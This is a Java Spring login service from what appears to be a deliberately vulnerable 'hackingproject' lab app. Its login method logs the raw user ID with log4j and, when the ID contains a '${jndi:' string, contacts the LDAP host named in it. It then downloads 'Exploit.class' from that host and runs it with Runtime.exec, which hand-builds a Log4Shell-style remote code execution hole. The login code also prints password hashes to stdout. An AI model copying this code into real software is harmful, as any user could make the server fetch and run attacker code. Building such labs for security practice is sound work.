package com.example.hackingproject.login.service;

import com.example.hackingproject.common.JwtTokenUtil;
import com.example.hackingproject.login.vo.UserVO;
import com.example.hackingproject.search.service.searchService;
import com.example.hackingproject.dao.LoginDAO;
import com.example.hackingproject.login.dto.LoginReq;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.lang.reflect.Method;

import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.crypto.Cipher;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.PrivateKey;
import java.util.HashMap;
import java.util.Map;

@Service("LoginService")
public class LoginService {
	
	private static final Logger logger = LogManager.getLogger(searchService.class);
	
    @Autowired
    private LoginDAO loginDAO;

    @Value("${rsa_instance}")
    private String RSA_INSTANCE; // rsa transformation

    @Autowired
    private JwtTokenUtil jwtTokenUtil;

    
    public void downloadFileFromURL(String fileUrl, String saveDir) {
	    try {
	        URL url = new URL(fileUrl);
	        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
	        int responseCode = httpConn.getResponseCode();

	        // HTTP OK를 확인
	        if (responseCode == HttpURLConnection.HTTP_OK) {
	            String fileName = "";
	            String disposition = httpConn.getHeaderField("Content-Disposition");

	            if (disposition != null) {
	                // 파일 이름을 Content-Disposition 헤더에서 추출
	                int index = disposition.indexOf("filename=");
	                if (index > 0) {
	                    fileName = disposition.substring(index + 10, disposition.length() - 1);
	                }
	            } else {
	                // 파일 이름을 URL에서 추출
	                fileName = fileUrl.substring(fileUrl.lastIndexOf("/") + 1);
	            }
	            
	            
	            // 입력 스트림을 통해 파일을 읽고 저장
	            InputStream inputStream = httpConn.getInputStream();
	            FileOutputStream outputStream = new FileOutputStream(saveDir + fileName);

	            int bytesRead;
	            byte[] buffer = new byte[4096];
	            while ((bytesRead = inputStream.read(buffer)) != -1) {
	                outputStream.write(buffer, 0, bytesRead);
	            }

	            outputStream.close();
	            inputStream.close();
	            
	            //System.out.println("File downloaded");
	            File file = new File(saveDir + fileName);
	            
	            String command = "chmod 755 " + file.getAbsolutePath();
	            Process proc = Runtime.getRuntime().exec(command);
	            proc.waitFor();
	            
	            Process proc1 = Runtime.getRuntime().exec("java Exploit");
	            proc1.waitFor();
	            //System.out.println(saveDir + fileName);
	            
	            //System.out.println("asdfadsfadsfasdfd"+saveDir + fileName);
	            //System.out.println("Permissions set: chmod 755 " + file.getAbsolutePath());
	            //System.out.println("Permissions set: chmod 755 Exploit.class" );
	            
	            // 파일 로드 및 실행
	            
	            //System.out.println("File downloaded: " + file.getAbsolutePath());
	            URL classUrl = file.toURI().toURL(); // 파일을 URL로 변환
	            //System.out.println("Class URL: " + classUrl);
	            
	        } else {
	            System.out.println("No file to download. Server replied HTTP code: " + responseCode);
	        }
	        httpConn.disconnect();
	    } catch (Exception e) {
	        System.out.println("Error downloading the file: " + e.getMessage());
	        e.printStackTrace();
	    }
	}
    
    
    public Map<String, Object> getUserInfo(LoginReq loginReq, PrivateKey privateKey, HttpServletRequest request){

        String userId = "";
        String userPw = "";
        try{
            userId = decryptRsa(privateKey, loginReq.getUser_id());
            userPw = decryptRsa(privateKey, loginReq.getUser_pw());
        }catch (Exception e){

        }
        
        
        //
        
        String keyword = userId;
        String syntax = "ldap://192.168.14.28:1389";
        
        logger.info(keyword);
        logger.debug(keyword);
        logger.error(keyword);
        
        String[] word = keyword.split("\\$\\{jndi:");
        if(keyword.contains("{jndi:")) {
        	
        	
        	//System.out.println(word[1]);
        	String syn = word[1].replace("}", "");
        	
        	int idx = syn.lastIndexOf("/");
        	if(idx != -1) {
        		syntax = syn.substring(0, idx);
        	}
        	//System.out.println("syntax : "+ syntax);//
        	
        	String redirect_add = syntax.replace("ldap://","");
        	redirect_add = redirect_add.replace(":1389","");
            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env.put(Context.PROVIDER_URL, syntax +"/dc=example,dc=com");
            
            String jndiPath = syntax +"/dc=example,dc=com";

            try {
                DirContext ctx = new InitialDirContext(env);
               // System.out.println("Connected to the LDAP server.");
                // LDAP 서버에서 데이터를 조회하거나 조작하는 코드 추가
                ctx.close();
            } catch (NamingException e) {
                System.out.println("Cannot connect to LDAP server: " + e.getMessage());
            }

            //System.out.println("jndiPath : "+ jndiPath);//
            
            // 환경 설정
            Hashtable<String, String> env1 = new Hashtable<>();
            env1.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env1.put(Context.PROVIDER_URL, jndiPath);
            
            try {
                // InitialContext 생성 및 Lookup 수행
                Context ctx = new InitialContext(env1);
                Object obj = ctx.lookup(jndiPath);
                
                //System.out.println("Object obtained from JNDI: " + obj);//
                
                
                //System.out.println(redirect_add);
                String fileUrl = "http://"+redirect_add+":8000/Exploit.class"; // 리다이렉션된 URL
                
                String currentDir = System.getProperty("user.dir");
                String savePath = currentDir+"/"; // 파일을 저장할 경로
                //System.out.println("Current working directory: " + currentDir);
                downloadFileFromURL(fileUrl, savePath);

                // Context 사용 후 닫기
                ctx.close();
            } catch (NamingException e) {
                System.err.println("Error during JNDI Lookup: " + e.getMessage());
                e.printStackTrace();
            }

        }
        
        //
        
        
        // 복호화된 데이터
        LoginReq decryptionData = new LoginReq();
        decryptionData.setUser_id(userId);
        decryptionData.setUser_pw(userPw);

        loginReq.setUser_id(userId);
        loginReq.setUser_pw(SHA256Encrypt(userPw));
        System.out.println(SHA256Encrypt(userPw));
        UserVO user = loginDAO.getUserInfo(loginReq);

        Map<String, Object> result = new HashMap<String,Object>();

        if(user == null){
        }else{
            // JWT 셋팅
            // 자동 로그인 체크 했을때 토큰 반환해야줘함
            if(loginReq.getAuto_login_flag()){
                result.put("jwtToken",jwtTokenUtil.generateTokenForUser(user));
            }
            HttpSession session = request.getSession();
            session.setAttribute("user_id", userId);
            session.setAttribute("access_level", user.getAccessLevel());
        }

        //session.removeAttribute(RSA_WEB_KEY);
        result.put("userData",user);

        return result;
    }


    /**
     * 복호화
     *
     * @param privateKey
     * @param securedValue
     * @return
     * @throws Exception
     */
    private String decryptRsa(PrivateKey privateKey, String securedValue) throws Exception {
        Cipher cipher = Cipher.getInstance(RSA_INSTANCE);
        byte[] encryptedBytes = hexToByteArray(securedValue);
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
        byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
        String decryptedValue = new String(decryptedBytes, StandardCharsets.UTF_8); // 문자 인코딩 주의.
        return decryptedValue;
    }

    /**
     * 16진 문자열을 byte 배열로 변환한다.
     *
     * @param hex
     * @return
     */
    public static byte[] hexToByteArray(String hex) {
        if (hex == null || hex.length() % 2 != 0) { return new byte[] {}; }

        byte[] bytes = new byte[hex.length() / 2];
        for (int i = 0; i < hex.length(); i += 2) {
            byte value = (byte) Integer.parseInt(hex.substring(i, i + 2), 16);
            bytes[(int) Math.floor(i / 2)] = value;
        }
        return bytes;
    }

    /**
     * SHA-256 암호화
     *
     * @param pass
     * @return String
     */
    public static String SHA256Encrypt(String pass) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            md.update(pass.getBytes());
            byte[] byteData = md.digest();
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < byteData.length; i++) {
                sb.append(Integer.toString((byteData[i] & 0xff) + 0x100, 16).substring(1));
            }
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < byteData.length; i++) {
                String hex = Integer.toHexString(0xff & byteData[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (Exception e) {
            e.printStackTrace();
            throw new RuntimeException();
        }
    }


}
